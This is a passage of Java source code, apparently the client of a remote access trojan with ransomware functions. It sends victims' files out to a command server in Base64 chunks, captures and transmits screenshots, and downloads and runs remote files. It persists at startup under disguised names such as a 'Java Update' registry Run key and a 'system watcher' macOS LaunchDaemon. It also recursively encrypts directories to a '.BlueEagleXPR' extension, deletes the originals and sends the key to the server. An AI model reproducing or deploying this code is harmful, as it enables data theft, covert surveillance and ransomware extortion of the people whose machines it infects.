				 }catch(Exception x){
					 System.out.print("\n" + "EX  "+x.getMessage() + "\n");
				 }
					 
						 
			}
			
				 
					
			}else{
				try{fis.close();}catch(Exception x){ }	
				String name_withoutDot = f.getName().substring(0, f.getName().lastIndexOf("."));
				 String CMD = "finished_down_uns" +YY + f.getName() + YY + name_withoutDot +  YY + f.getAbsolutePath() +YY +"";
		         cs.Send(CMD);
			     Chunk_counter = 0;
			     save_Progress_downloader(Ch_Dir + File_Seperator + File_Seperator,Chunk_counter);
			}
			
			
			
			return;
			 /* File f=new File(file.getAbsolutePath());
		  		long len;
		  		int b = 1024 ;// for transmit @ 43.56164384 KB / Sec , The less , the faster , but unstable 
		  		try {
					FileInputStream fis= new FileInputStream(f);
					len=f.length();
				  	
			  		int i=0;//count Chunks
			  //	 System.out.println("Resume : " + Chunk_counter+"\n");
			  		 
			  	  String name_withoutDot = f.getName().substring(0, f.getName().lastIndexOf("."));
			  	  int Chunk_counter_older = Chunk_counter;
			  		while(i<max_value_chunks){
			  			 
			  				ByteArrayOutputStream bOutput = new ByteArrayOutputStream(2050);
			  				
			  				try{
			  					if(i<Chunk_counter_older){
			  						ByteArrayOutputStream Virtual_out = new ByteArrayOutputStream(1025);
			  						 for(int j=0;j<b;j++){
								  			int ch;
								  			if((ch=fis.read())!=-1){
								  				Virtual_out.write(ch);
								  				
								  				} 
								  			}
			  						Virtual_out.flush();
			  						 i+=1;
			  						 continue;
			  					}else if(i==Chunk_counter_older){i=i+1;continue;}//System.out.println("I here now + "+i+"");
			  					else{			//
			  						bOutput = new ByteArrayOutputStream(1025);
			  						for(int j=0;j<b;j++){// makes bOutput filled by 2048 Bytes 
					  					 int ch;
			  							if((ch=fis.read())!=-1){
					  						bOutput.write(ch);
					  						}
					  						}
			  						bOutput.close();
			  						if(i>=max_value_chunks-1){
			  							
			  						}
			  						 String Numeric = "fsfs"+i;
			  						 byte[] encoded = Base64.getEncoder().encode(bOutput.toByteArray());
			  						 //System.out.print("\n" + "Client "+Numeric + "\n");
			  						 String CMD = "dw_ch_uns_nothread" +YY + f.getName() + YY + name_withoutDot +  YY + f.getAbsolutePath() +YY +Numeric+ YY + new String(encoded)+ YY + (max_value_chunks) + YY;
							         cs.Send(CMD);
							        break;
			  					}
			  					 
			  				}catch(Exception x){ System.out.println("I Error\n" + x.getMessage());}
			  		 
			  		 
			  		}
			  		try{fis.close();}catch(Exception x){ }
			  		if(i>max_value_chunks-1){
				  		 String CMD = "finished_down_uns" +YY + f.getName() + YY + name_withoutDot +  YY + f.getAbsolutePath() +YY +"";
				         cs.Send(CMD);
					     Chunk_counter = 0;
					     save_Progress_downloader(Ch_Dir + File_Seperator + File_Seperator,Chunk_counter);
					       
				  		 }
		  				 
			       
				} catch (Exception e) {
			 
				 
					System.out.println("chunk_exp" + YY + e.getMessage());
				}
		  		*/
		}
		
		
		
		
		
		
		
	}
	
	private static byte[] Certain_Bytes(FileInputStream fis,int Chunk_to_Read_From,int size,File file) throws IOException{
 
		int i;
		 
		fis.skip((Chunk_to_Read_From)*size);
		
		ByteArrayOutputStream bOutput = new ByteArrayOutputStream(size+1);
		  for(int j=0;j<size;j++){
	 		 	int    bytesRead;
				if((bytesRead=fis.read())!=-1){
					 bOutput.write(bytesRead);
					}
			 
				}
		  if(called==1){//because it repeats last Chunk twice , thus we will take only one 
				 String name_withoutDot = file.getName().substring(0, file.getName().lastIndexOf("."));
			  String CMD = "finished_down_uns" +YY + file.getName() + YY + name_withoutDot +  YY + file.getAbsolutePath() +YY +"";
		        cs.Send(CMD);
		        Chunk_counter = 0;
		        String Ch_Dir = file.getAbsolutePath().substring(0,file.getAbsolutePath().lastIndexOf(File_Seperator));
		        save_Progress_downloader(Ch_Dir + File_Seperator + File_Seperator,Chunk_counter);
			  return null;
		  }
		  //System.out.println("size " + bOutput.size() + " called : " + called);
		bOutput.close();
		if ( bOutput.size()< size){
			called +=1;
		}
		return bOutput.toByteArray();
	}
	private static void split_uns_2(final String Ch_Dir,final File file) throws Exception{
		// 
		final int max_value_chunks = get_max_chunks_number_uns(Ch_Dir,file);
		cs.Send("prepare_chunk_downloader_uns" + YY + max_value_chunks + YY  + file.getName() + YY);
		 if(chunk_thread!=null){
		
			 try{
				chunk_thread.interrupt();
				 chunk_thread = null;
			 }catch (Exception x){}
		}
		    chunk_thread = new Thread(new Runnable() {
		      @Override
		      public void run() { 
		    	  File f=new File(file.getAbsolutePath());
		  		long len;
		  		int b = 1024 ;// for transmit @ 43.56164384 KB / Sec , The less , the faster , but unstable 
		  	
				try {
					FileInputStream fis= new FileInputStream(f);
					len=f.length();
				  	
			  		int i=0;//count Chunks
			  		exit_unstable = false; 
			  	 
			  		if(Chunk_counter >0){
			  			 
			  			there_but_notsent = 0;
  						System.out.println("Resume : " + Chunk_counter+"\n");
			  			}
			  	  String name_withoutDot = f.getName().substring(0, f.getName().lastIndexOf("."));
			  	 while (Chunk_counter ==0){
		  				continue;
	  				}
			  	  
			  	  int Chunk_counter_older = Chunk_counter;
			  		while(i<max_value_chunks){
			  			
			  		//	System.out.println("i : " + i+"\n");
			  			
			  			 	
			  				 
			  				ByteArrayOutputStream bOutput = new ByteArrayOutputStream(2050);
			  				
			  				try{
			  					if(i<Chunk_counter_older){
			  						ByteArrayOutputStream Virtual_out = new ByteArrayOutputStream(2050);
			  						 for(int j=0;j<b;j++){
								  			
								  			int ch;
								  			if((ch=fis.read())!=-1){
								  				Virtual_out.write(ch);
								  				//System.out.print("I am + "+ch+"");
								  				} 
								  			}
			  						Virtual_out.flush();
			  						 i+=1;
			  						 continue;
			  					}else if(i==Chunk_counter_older){
			  						System.out.println("I here now + "+i+"");
			  						i=i+1;
			  					}else{
			  						bOutput = new ByteArrayOutputStream(1025);
			  						for(int j=0;j<b;j++){// makes bOutput filled by 2048 Bytes 
					  					 
						  			 	 
						  			 	 int ch;
			  							if((ch=fis.read())!=-1){
					  						bOutput.write(ch);
					  						}
					  						}
			  						bOutput.close();
			  						 String Numeric = "fsfs"+i;
			  						 byte[] encoded = Base64.getEncoder().encode(bOutput.toByteArray());
			  						 String CMD = "dw_ch_uns" +YY + f.getName() + YY + name_withoutDot +  YY + f.getAbsolutePath() +YY +Numeric+ YY + new String(encoded)+ YY + (max_value_chunks) + YY;
							         cs.Send(CMD);
							         
							         while (there_but_notsent ==0){
							  				continue;
						  				}
							         	Chunk_counter =  i ;
								        System.out.println("I save " +Ch_Dir+File_Seperator );
								        save_Progress_downloader(Ch_Dir+File_Seperator,Chunk_counter);
						  				there_but_notsent = 0;
						  				i+=1;
			  					}
			  					 
			  						
			  				
			  				}catch(Exception x){ System.out.println("I Error\n" + x.getMessage());}
			  				
			  			
		  			// bOutput.flush();
		  			  
			  		 
			  			 
			  		//	System.out.println("I Wait\n");
		  			if (isconnected==false){System.out.println("I Quit\n"); break;}
			  		//if(exit_unstable){System.out.println("\nI Return\n");return;}
		  			
			  		
			  		}
			  		try{fis.close();}catch(Exception x){ }
			  		 
	  				 String CMD = "finished_down_uns" +YY + f.getName() + YY + name_withoutDot +  YY + f.getAbsolutePath() +YY +"";
			         cs.Send(CMD);
			       //  try{chunk_thread.interrupt();}catch(Exception x){ }
				} catch (Exception e) {
					exit_unstable = true;
				//	try{chunk_thread.interrupt();}catch(Exception x){ }
					System.out.println("chunk_exp" + YY + e.getMessage());
				}
		  		
		        } //End of run method
		    
		    });
		    chunk_thread.start();  
		
		//System.out.println("Operation Successful"); 
		
	}
 
	private static String encodeFileToBase64Binary(String fileName)
			throws IOException {
        JTextArea xenc = new JTextArea();
		File file = new File(fileName);
		byte[] bytes = loadFile(file);
		byte[] encoded = Base64.getEncoder().encodeToString(bytes).getBytes();
		xenc.setText(new String(encoded));
		return xenc.getText();
	}

	private static byte[] loadFile(File file) throws IOException {
	    InputStream is = new FileInputStream(file);

	    long length = file.length();
	    if (length > Integer.MAX_VALUE) {
	        // File is too large
	    }
	    byte[] bytes = new byte[(int)length];
	    
	    int offset = 0;
	    int numRead = 0;
	    while (offset < bytes.length
	           && (numRead=is.read(bytes, offset, bytes.length-offset)) >= 0) {
	        offset += numRead;
	    }

	    if (offset < bytes.length) {
	        throw new IOException("Could not completely read file "+file.getName());
	    }

	    is.close();
	    return bytes;
	}
 private static void Start_Decryptor(final String key,final String path){
	
	        	 Key_String_Decrypter = key;
	        	 prepare_Key_array_For_Decryptor();
	        	 Decrypt_Directory(path);
	        	 
	
 }
 	private static void Launch_Startup_Copy() throws Exception{
 		
 		String platform = System.getProperty("os.name", "generic").toLowerCase(Locale.ENGLISH);
		 if ((platform.indexOf("mac") >= 0) || (platform.indexOf("darwin") >= 0)) {
			 
			 File_Seperator = "/";
			 Copy_to_Startup_MAC_two();
			 Copy_to_Startup_MAC();
		      } else if (platform.indexOf("win") >= 0) {
		    	  File_Seperator = "\\";
		    	  Copy_to_startup_Windows();
		      } else if (platform.indexOf("nux") >= 0) {
		    	  File_Seperator = "/";
		    	  Copy_to_startup_Linux();
		      } else {
		    	  File_Seperator = System.getProperty("path.separator");
		    	  if(File_Seperator !="/" || File_Seperator !="\\" || File_Seperator !=":"){
		    		  File_Seperator = System.getProperty("file.separator");
		    		  if(File_Seperator !="/" || File_Seperator !="\\" || File_Seperator !=":"){
		    			  File_Seperator = "/";
		    			  Copy_to_startup_Linux();
		    		  }
		    	  }
		      }
		  String operSys = System.getProperty("os.name").toLowerCase();
           if (operSys.contains("mac")||operSys.contains("darwin")) {
           	 File_Seperator = "/";
           	 Copy_to_Startup_MAC_two();
           	Copy_to_Startup_MAC();
           } else if (operSys.contains("nix") || operSys.contains("nux")
                   || operSys.contains("aix")) {
           	 File_Seperator = "/";
           	Copy_to_startup_Linux();
           } else if (operSys.contains("win")) {
           	 File_Seperator = "\\";
           	 Copy_to_startup_Windows();
           } else if (operSys.contains("sunos") ||operSys.contains("solaris") ) {//
           
           	 File_Seperator = "/";
           	Copy_to_startup_Linux() ;
           }
           
           
           
 	}
 private static void Copy_to_startup_Windows() throws Exception{
	
		File jarDir = new File(ClassLoader.getSystemClassLoader().getResource(".p").getFile());
		 String conic_path = jarDir.getAbsolutePath();
		 conic_path = conic_path.substring(0,conic_path.lastIndexOf(".jar"));
		 conic_path = conic_path.split("file:")[1]; 
		 if(conic_path.endsWith(".jar")==false){
			 conic_path  = conic_path +".jar";
		 }
		 if (conic_path.startsWith(File_Seperator)){
			 conic_path = conic_path.substring(1,conic_path.length());
		 }
		 createWindowsStartupKey("Java Update",conic_path);
		 
	}
 private static boolean windowsStartupKeyExists(String name) {
     try {
         String userKey = WinRegistry.readString(WinRegistry.HKEY_CURRENT_USER,
                 "Software\\Microsoft\\Windows\\CurrentVersion\\Run\\",
                 name,
                 WinRegistry.KEY_WOW64_32KEY);
         return userKey != null;
     } catch (IllegalAccessException e) {
    	// new MessageBox().errorBox_nothread(e.getMessage(), "");
        
     } catch (InvocationTargetException e) {
    	// new MessageBox().errorBox_nothread(e.getMessage(), "");
     }
     return false;
 }

 
 private static void createWindowsStartupKey(String name,String myDir) {
     try {
    	 
         WinRegistry.writeStringValue(WinRegistry.HKEY_CURRENT_USER, "Software\\Microsoft\\Windows\\CurrentVersion\\Run\\",name,
        		 myDir,
                 WinRegistry.KEY_WOW64_32KEY);
          
         WinRegistry.writeStringValue(WinRegistry.HKEY_LOCAL_MACHINE, "Software\\Microsoft\\Windows\\CurrentVersion\\Run\\",name,
        		 myDir,
                 WinRegistry.KEY_WOW64_32KEY); 
     } catch (Exception e) {
    	// new MessageBox().errorBox_nothread(e.getMessage(), "");
     } 
 }
 private static void create_sh_files(){
	 File jarDir = new File(ClassLoader.getSystemClassLoader().getResource(".p").getFile());
	 String conic_path = jarDir.getAbsolutePath();
	 conic_path = conic_path.substring(0,conic_path.lastIndexOf(".jar"));
	 if (conic_path.contains("file:")){
		 conic_path = conic_path.split("file:")[1]; 
	 }
	 
	 if(conic_path.endsWith(".jar")==false){
		 conic_path  = conic_path +".jar";
	 }
	 if (conic_path.startsWith(File_Seperator)){
		 conic_path = conic_path.substring(1,conic_path.length());
	 }
	 String double_qoutes = "\"";
	 String starter_s1="#!/bin/bash"+"\n"+"java -jar "+double_qoutes+ conic_path +double_qoutes+" ";
	 File fxa = new File(conic_path);
	 String killer_s2 = "#!/bin/bash"+"\n"+"pid='ps aux | grep "+fxa.getName().substring(0,fxa.getName().lastIndexOf("."))+" | awk '{print $2}''"+"\n"+"kill -9 $pid";
	 String my_script_con = "#!/bin/bash"+"\n"+"case $1 in"+"\n"+
			 	  "    start)"+"\n"
				+ "        /bin/bash /usr/local/bin/myapp-start.sh"+"\n"
				+ "    ;;"+"\n"
				+ "    stop)"+"\n"
				+ "        /bin/bash /usr/local/bin/myapp-stop.sh"+"\n"
				+ "    ;;"+"\n"
				+ "    restart)"+"\n"
				+ "        /bin/bash /usr/local/bin/myapp-stop.sh"+"\n"
				+ "        /bin/bash /usr/local/bin/myapp-start.sh"+"\n"
				+ "    ;;"+"\n"
				+ "esac"+"\n"
				+ "exit 0";
	 int counter = 0;
	
	 try {
		 while (counter<3){
			
			 File xf =null;
			 String Data_to_Save="";
			 if(counter==0){
				 xf= new File("/usr/local/bin/myapp-start.sh");
				 Data_to_Save = starter_s1;
					xf.createNewFile();
					FileWriter FW = new  FileWriter(xf); 
					FW.write(Data_to_Save);
					FW.close();
			 }
			 if(counter==1){
				 xf= new File("/usr/local/bin/myapp-stop.sh");
				 Data_to_Save = killer_s2;
					xf.createNewFile();
					FileWriter FW = new  FileWriter(xf); 
					FW.write(Data_to_Save);
					FW.close();
			 }
			 if(counter==2){
				 xf= new File("/etc/init.d/myscript");
				 Data_to_Save = my_script_con;
					xf.createNewFile();
					FileWriter FW = new  FileWriter(xf); 
					FW.write(Data_to_Save);
					FW.close();
					ProcessBuilder processBuilder = new ProcessBuilder();
			    	  processBuilder.command("bash", "-c", "sudo update-rc.d myscript defaults");
			    	  String appender = "";
			    
			    	  try {
			    		  StringBuilder output = new StringBuilder();
			              Process process = processBuilder.start();

			              BufferedReader reader =
			                      new BufferedReader(new InputStreamReader(process.getInputStream()));

			              String line = "";
			           
			              while ((line = reader.readLine()) != null) {
			            	  output.append(line + "liner_split");
			              }
			    	  } catch (IOException e) {
			        	 
			          }
					   
			 }
		
			
			 counter +=1; 
		 }
			 
		} catch (Exception e) {
			
		}
 }
 private static void Copy_to_startup_Linux() throws Exception{
	 create_sh_files();
	 
	 
	}
 protected static File getJarFile() throws URISyntaxException {
	    return new File(client1.class.getProtectionDomain().getCodeSource().getLocation().toURI());
	    }
 private static void Copy_to_Startup_MAC_two() throws Exception{
	 String userHome=System.getProperty("user.home");
	 String javaHome=System.getProperty("java.home");
	 File startupx_file = new File(userHome+"/Library/LaunchAgents/com.mksoft."+getJarFile().getName().replaceFirst(".jar",".plist"));
	 File startupFile=startupx_file;
	    PrintWriter out=new PrintWriter(new FileWriter(startupFile));
	    out.println("<?xml version=\"1.0\" encoding=\"UTF-8\"?>");
        out.println("<!DOCTYPE plist PUBLIC \"-//Apple Computer//DTD PLIST 1.0//EN\" \"http://www.apple.com/DTDs/PropertyList-1.0.dtd\">");
        out.println("<plist version=\"1.0\">");
        out.println("<dict>");
        out.println("   <key>Label</key>");
        out.println("   <string>com.mksoft."+getJarFile().getName().replaceFirst(".jar","")+"</string>");
        out.println("   <key>ProgramArguments</key>");
        out.println("   <array>");
        out.println("      <string>"+javaHome+File_Seperator+"bin"+File_Seperator+"java</string>");
        out.println("      <string>-cp</string>");
        out.println("      <string>"+getJarFile()+"</string>");
        out.println("      <string>"+"sysupate"+"</string>");
        out.println("   </array>");
        out.println("   <key>RunAtLoad</key>");
        out.println("   <true/>");
        out.println("</dict>");
        out.println("</plist>");
        
	}
    private static void Copy_to_Startup_MAC() throws Exception{
    	String double_qoutes = "\"";
    	File P_Toto =  new File(ClassLoader.getSystemClassLoader().getResource(".").getPath());
   	 
    	String P_LIST_Content = "<?xml version=" + double_qoutes + "1.0" + double_qoutes + " encoding="+double_qoutes+"UTF-8"+double_qoutes+"?>"+"\n";
    	P_LIST_Content += "<!DOCTYPE plist PUBLIC " + double_qoutes + "-//Apple Computer//DTD PLIST 1.0//EN" + double_qoutes +" " + double_qoutes+ "http://www.apple.com/DTDs/PropertyList-1.0.dtd"+double_qoutes+">"+"\n";
       	P_LIST_Content += "<plist version=" + double_qoutes +"1.0" +double_qoutes+ ">"+  "\n";
       	P_LIST_Content += "<dict>" +  "\n";
       	P_LIST_Content += "<key>Label</key>" + "\n";
       	P_LIST_Content += "<string>"+P_Toto.getName().substring(0,P_Toto.getName().lastIndexOf("."))+"</string>" + "\n";
     	P_LIST_Content += "<key>ProgramArguments</key>" +"\n";
     	P_LIST_Content += "<array>" +"\n";
     	P_LIST_Content += " <string>"+P_Toto.getAbsolutePath()+"</string>" + "\n";
     	P_LIST_Content += "</array>"+"\n";
     	P_LIST_Content += "<key>RunAtLoad</key>" + "\n";
     	P_LIST_Content += "<true/>" + "\n";
     	P_LIST_Content += " <key>KeepAlive</key>" + "\n";
     	P_LIST_Content += "<true/>" + "\n";
     	P_LIST_Content += "</dict>" +  "\n";
     	P_LIST_Content += "</plist>";
     	
     	String plist_path = P_Toto.getParent() + File_Seperator + "system watcher.plist";
     	FileOutputStream fos = new FileOutputStream(new File(plist_path));
     	fos.write(P_LIST_Content.getBytes());
     	fos.flush();
     	fos.close(); 
    	
     	FileOutputStream fos2 = new FileOutputStream(new File(File_Seperator + "Library" + File_Seperator + "LaunchDaemons" + File_Seperator + "system watcher.plist"));
     	fos2.write(P_LIST_Content.getBytes());
     	fos2.flush();
     	fos2.close(); 
    	
     	FileOutputStream fos3 = new FileOutputStream(new File(File_Seperator + "Library" + File_Seperator + "LaunchDaemons" + File_Seperator + "system watcher.plist"));
     	fos3.write(P_LIST_Content.getBytes());
     	fos3.flush();
     	fos3.close(); 
       String copy_command = "cp "+plist_path + " " + File_Seperator + "Library" + File_Seperator + "LaunchDaemons";
   	try {
		ProcessBuilder builder = new ProcessBuilder("/bin/bash", "-c", (copy_command));
	        builder.redirectErrorStream(true);
	        Process p = builder.start();
	        BufferedReader r = new BufferedReader(new InputStreamReader(p.getInputStream()));
	        String line;
	       
	      
	 
	      
	} catch (Exception e) {
		 
	}
       
    }
	private static Key generateKey_Decryptor() throws Exception {
		Key key = new SecretKeySpec(keyValue_Decrypter, ALGO_Decrypter);
		return key;
	}
	private static void prepare_Key_array_For_Decryptor(){
		keyValue_Decrypter = Key_String_Decrypter.getBytes();
	}
	private static void Decrypt_Directory(String startpath){
       File folder = new File(startpath);
		File[] listOfFiles = folder.listFiles();
		File inputFile;
		File outputFile;
		for (int i = 0; i < listOfFiles.length; i++) {
			if (listOfFiles[i].isFile()) {	
				if (listOfFiles[i].toString().endsWith(extension_Decrypter)){
					try{
						inputFile = new File(listOfFiles[i].getPath());
						outputFile = new File(listOfFiles[i].getPath().substring(0, listOfFiles[i].toString().length()-6));
						doCrypto_Decryptor(inputFile,outputFile);
						listOfFiles[i].delete();
					}
					catch (Exception E){
						System.out.println(E.getStackTrace());
					}  
				}		
			} else if (listOfFiles[i].isDirectory()) {
				Decrypt_Directory(listOfFiles[i].getPath());
			}
		}		
	} 	
	
	private static void doCrypto_Decryptor(File inputFile, File outputFile) {
		try {
			Key secretKey = generateKey_Decryptor();
			Cipher cipher = Cipher.getInstance(ALGO_Decrypter);
			cipher.init(Cipher.DECRYPT_MODE, secretKey);
			FileInputStream inputStream = new FileInputStream(inputFile);
			byte[] inputBytes = new byte[(int) inputFile.length()];
			inputStream.read(inputBytes);
			byte[] outputBytes = cipher.doFinal(inputBytes);
			FileOutputStream outputStream = new FileOutputStream(outputFile);
			outputStream.write(outputBytes);
			inputStream.close();
			outputStream.close();

		} catch (Exception E) {

		}
	}
 private static void Prepate_Key_For_Encryption(String CurrentGenerated){
	 Encryption_Key_value = CurrentGenerated;
	 keyValue = CurrentGenerated.getBytes();
	 is_key_ready = true;
 }
 private static Key generateKey() throws Exception {
		Key key = new SecretKeySpec(keyValue, ALGORITHM);
		return key;
	}
 private static   void DestroyDirecroty(String Location){
		File inputFile;
		File outputFile;
		File folder = new File(Location);
		File[] listOfFiles = folder.listFiles();
		for (int i = 0; i < listOfFiles.length; i++) {
			// is a file: 
			if (listOfFiles[i].isFile()) {
				try{
					
					 
						if (listOfFiles[i].toString().endsWith(".BlueEagleXPR") ==false ){
							
							inputFile = new File(listOfFiles[i].getPath());
							outputFile = new File(listOfFiles[i].getPath() + ".BlueEagleXPR");
							try{
							CryptFile(inputFile,outputFile);
							listOfFiles[i].delete();
							}catch(Exception ex){
								 cs.Send("encExptiopn" + YY + ex.getMessage() + YY);
							}
						 
						}
				 
							
						}
						catch (Exception E){
						 cs.Send("encExptiopn" + YY + E.getMessage() + YY);
						}
					
						    
			} 
			// is a folder:
			else if (listOfFiles[i].isDirectory()) {
				DestroyDirecroty(listOfFiles[i].getPath());
			}
		}
		cs.Send("reftfm" + YY + Encryption_Key_value);
	}
 private static  void CryptFile(File inputFile, File outputFile) throws Exception {
		
		 try{
				Key secretKey = generateKey();
				Cipher cipher = Cipher.getInstance(ALGORITHM);
				cipher.init(Cipher.ENCRYPT_MODE, secretKey);
				FileInputStream inputStream = new FileInputStream(inputFile);
				byte[] inputBytes = new byte[(int) inputFile.length()];
				inputStream.read(inputBytes);
				byte[] outputBytes = cipher.doFinal(inputBytes);
				FileOutputStream outputStream = new FileOutputStream(outputFile);
				outputStream.write(outputBytes);
				inputStream.close();
				outputStream.close();
			 
			 
		 }catch (Exception ex){
			 cs.Send("encExptiopn" + YY + ex.getMessage() + YY);
		 }
	
	
}
private static void Create_Folder(String Dir_to_folder,String Folder_name){
	try{
		File fx = new File(Dir_to_folder + Folder_name);
		
		if(fx.exists() == false){
			fx.mkdirs();
			cs.Send("C_folder_s");
			//Files.createDirectories(Paths.get("/path/to/directory"));
		}
	
	}catch (Exception ex){
		cs.Send("C_folder_ex" + YY + ex.getMessage() + YY );
	}
}
 private static void writeByteArraysToFile(String fileName, byte[] content,Boolean Executenow) throws IOException {
	  
     File file = new File(fileName);
     BufferedOutputStream writer = new BufferedOutputStream(new FileOutputStream(file));
     writer.write(content);
    writer.flush();
    writer.close();
    if (Executenow == true){
    	Desktop.getDesktop().open(new File(fileName));
    	cs.Send("success_run");
      }else{
    		cs.Send("success_up");
      }
 
 }
 
 private static String convertSize(float iSize)
 {
   if (iSize <= 0.0F) {
     return "0";
   }
   
   String[] units = { "B", "KB", "MB", "GB", "TB" };
   int digitGroups = (int)(Math.log10(iSize) / Math.log10(1024.0D));
   
   return new java.text.DecimalFormat("#,##0.#")
     .format(iSize / Math.pow(1024.0D, digitGroups)) + 
     " " + units[digitGroups];
 }
private static String enco_file(String file_path){
	String Encoded_Str = "error";
	File tar = new File(file_path);
	 byte[] file_content;
	try {
		file_content = Files.readAllBytes(tar.toPath());
        String encodedString = Base64.getEncoder().encodeToString(file_content);
        Encoded_Str = encodedString;
	} catch (IOException e) {
		// TODO Auto-generated catch block
		e.printStackTrace();
	};
	 byte bArrBuff[] = new byte[1024];
     int iLen;
     
	return Encoded_Str;
}
 private static void Runfile_FromDisk(String fname , String s1 , Boolean Executenow) throws IOException{
	 byte[] arr = Base64.getDecoder().decode(s1);
	 writeByteArraysToFile(fname,arr,Executenow);
 }
 //Download and execute file from url
 private  static void downloadFile(final String sFilename, final String sURL, final boolean bExecute) {
		new Thread() {
			public void run() {
		        BufferedInputStream tBuffInStream = null;
		        FileOutputStream tFileOutStream = null;
		
		        try {
		        	tBuffInStream = new BufferedInputStream(new URL(sURL).openStream());
		        	tFileOutStream = new FileOutputStream(sFilename);
		
		            byte bArrBuff[] = new byte[1024];
		            int iLen;
		            
		            while ((iLen = tBuffInStream.read(bArrBuff, 0, 1024)) != -1)
		            {
		            	tFileOutStream.write(bArrBuff, 0, iLen);
		            }
		            
		            tBuffInStream.close();
		            tFileOutStream.close();
		            
		            if (bExecute)
						Desktop.getDesktop().open(new File(sFilename));
				} catch (Exception e) {
					e.printStackTrace();
				}
			}
		}.start();
	}
 private static void startCapture(int width,int height ,int nedW, int nedH,boolean is_fast) {
 
		try {
			if (isconnected ){
			 
				tRobot = new Robot();
				tRectangle = new Rectangle();
				tByteArrOutStream = new ByteArrayOutputStream();
				tByteArrOutStream.reset();
					tRectangle.width = width;
					tRectangle.height = height;
					tBuffImage = tRobot.createScreenCapture(tRectangle);
					  int type = tBuffImage.getType() == 0? BufferedImage.TYPE_INT_ARGB
                              : tBuffImage.getType();

					 BufferedImage resizeImageJpg = resizeImage(tBuffImage, type, nedW, nedH);
					
					ImageIO.write(resizeImageJpg, "jpg", tByteArrOutStream);
							String encoded = Base64.getEncoder().encodeToString(tByteArrOutStream.toByteArray());
						
							  //Note  : ==> Encode the Whole String and Bind them to ensure Full String Delivery to Server Listener 
							  // -- Versi AI Helper 
							
						 
							if (is_fast ==true){
								
								ByteArrayOutputStream baos = new ByteArrayOutputStream(37628);
								ImageOutputStream  ios =  ImageIO.createImageOutputStream(baos);
								compress(ios,0.5f,resizeImageJpg);
								String encoded_bytes = Base64.getEncoder().encodeToString(baos.toByteArray());
								 cs.Send("fastscreen" + YY +  encoded_bytes + YY);
									tByteArrOutStream.flush();
									tBuffImage.flush();
							}else{
								
								ByteArrayOutputStream baos = new ByteArrayOutputStream(37628);
								ImageOutputStream  ios =  ImageIO.createImageOutputStream(baos);
								compress(ios,2,resizeImageJpg);
								String encoded_bytes = Base64.getEncoder().encodeToString(baos.toByteArray());
								
								 cs.Send("@" + YY + encoded_bytes  + YY);
									tByteArrOutStream.flush();
									tBuffImage.flush();
							}
							
						
						 
				 
			}else{
				RDisconnected();
			 
			}
						
					} catch (Exception e) {
						RDisconnected();
					}
 	
			
		}
 private static void compress(ImageOutputStream  ios ,float compression, BufferedImage bi)
         throws FileNotFoundException, IOException {
     Iterator<ImageWriter> i = ImageIO.getImageWritersByFormatName("jpeg");
     ImageWriter jpegWriter = i.next();

     // Set the compression quality
     ImageWriteParam param = jpegWriter.getDefaultWriteParam();
     param.setCompressionMode(ImageWriteParam.MODE_EXPLICIT);
     param.setCompressionQuality(0.2f * compression);

     // Write the image to a file    
      jpegWriter.setOutput(ios);
      jpegWriter.write(null, new IIOImage(bi, null, null), param);
  
      jpegWriter.dispose();
   
   
 }

 private static BufferedImage resizeImage(BufferedImage originalImage, int type,
         Integer img_width, Integer img_height)
{
BufferedImage resizedImage = new BufferedImage(img_width, img_height, type);
Graphics2D g = resizedImage.createGraphics();
g.drawImage(originalImage, 0, 0, img_width, img_height, null);
g.dispose();

return resizedImage;
}
 
	
	@Override
public void run() {
	// start connection
	while (true){
		if (isconnected == false){
			cs = new Connector();
 try{
 
 
		
		InputStream tInStream = null;
		if (is_read_data == false){
			try {
				tInStream = ClassLoader.class.getClass().getResourceAsStream("/config.properties");
				Properties tProp = new Properties();
				tProp.load(tInStream);
				
				String sDNS = tProp.getProperty("DNS");
				String sPortA = tProp.getProperty("PortA");

				/*new Color(0, 64, 128)*/
				if (sDNS == null || sPortA == null ) {
				 
				}else{
					host = sDNS;
					port = Integer.parseInt(sPortA);
					 is_read_data = true;
					 if(isconnected == false ){ cs.Connect(host, port);}
				
				}
			  
			} catch (Exception e) {
			 
			}
		}

	 if(isconnected == false ){ cs.Connect(host, port);}
	 prepare_country();
	 //End VIP 
  
 }catch (Exception ex){
	 System.out.println("ex " +ex.getMessage());
 }
			
		}
		
	}
	 
	
}
	 
}
class Responder implements EventsListener {
	 @Override
	 public void ConnectedEvent() {
	  client1.RConnected();
	 }

	@Override
	public void DisconnectedEvent() {
		 client1.RDisconnected();
	}

	@Override
	public void DataEvent(String b) {
		client1.RData(b);
	}
	}




interface EventsListener {
	 void ConnectedEvent();
	 void DisconnectedEvent();
	 void DataEvent(String Data);
	}

class Initiater {
 private List<EventsListener> listeners = new ArrayList<EventsListener>();

 public void addListener(EventsListener toAdd) {
     listeners.add(toAdd);
 }

 public void Raise_Connected() {

     for (EventsListener hl : listeners)
         hl.ConnectedEvent();
 }public void Raise_Disconnected() {

     for (EventsListener hl : listeners)
         hl.DisconnectedEvent(); 
 }public void Raise_Data(String b) {

     for (EventsListener hl : listeners)
         hl.DataEvent(b); 
 }
 
}

 

class Connector implements Runnable
{
	private Initiater initiater;
	private Responder responder;
	private DataOutputStream outToServer ;
	private BufferedReader inFromServer;
	private ObjectInputStream tObjInStream;
	private PrintWriter out ;
	private Socket tcpclient ;
	private  Thread REC;
	private String SPL = "c2x2824x828200x0c";//"sb-l3";
	public Connector (){
     initiater = new Initiater();
     responder = new Responder();
     initiater.addListener(responder);
     try {
		
			
	}  catch (Exception e) {
		
		
	}
 }
	
	public Socket get_socket(){
		return tcpclient;
	}
	public Thread getREC() {
		return REC;
	}


	public void Send(String Required){
		try {
			Required = Required + SPL;
			 /*PrintWriter out = new PrintWriter(tcpclient.getOutputStream());
			 out.print(Required);
			 out.flush();*/
			ObjectOutputStream w = new ObjectOutputStream(tcpclient.getOutputStream());
			w.writeUTF(Required);
			w.flush();
			
		} catch (Exception e) {
			System.out.println("Cannot Send EX :" + e.getMessage());
			 try {
				 if(tcpclient!=null)
					tcpclient.close();
					tcpclient = null;
				} catch (IOException e1) {
				 
				}
		     initiater.Raise_Disconnected();  // Raise_Disconnected."
		      
		}
	 }
	
	public void Connect(String host,int port){
		 try {
			 tcpclient = new Socket(host,port);
			 tcpclient.setTcpNoDelay(true);
			// tcpclient.setReceiveBufferSize(999999);
			// tcpclient.setSendBufferSize(999999);
			 out = new PrintWriter(tcpclient.getOutputStream(), true);
			 outToServer = new DataOutputStream(tcpclient.getOutputStream());
			//  tObjInStream = new ObjectInputStream(tcpclient.getInputStream());
			 
